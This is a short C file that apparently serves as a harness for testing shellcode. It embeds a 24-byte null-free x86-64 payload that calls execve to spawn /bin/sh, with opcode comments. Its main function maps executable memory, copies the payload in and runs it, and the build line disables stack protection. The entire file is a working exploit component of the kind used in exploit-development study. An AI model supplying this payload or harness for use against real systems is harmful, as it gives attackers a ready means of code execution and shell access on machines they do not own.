// test_harness.c — C test harness for shellcode execution
// Compile: gcc -o test test_harness.c -z execstack
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

// 24-byte null-free execve("/bin/sh", NULL, NULL) shellcode
unsigned char shellcode[] = {
    0x48, 0x31, 0xf6,       // xor rsi, rsi
    0x56,                   // push rsi
    0x48, 0xbf,             // mov rdi, imm64
    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,  // "//bin/sh"
    0x57,                   // push rdi
    0x54,                   // push rsp
    0x5f,                   // pop rdi
    0x48, 0x31, 0xd2,       // xor rdx, rdx
    0xb0, 0x3b,             // mov al, 59
    0x0f, 0x05              // syscall
};

int main(void) {
    void *exec = mmap(NULL, 4096,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    memcpy(exec, shellcode, sizeof(shellcode));

    void (*shell)() = exec;
    shell();

    return 0;
}
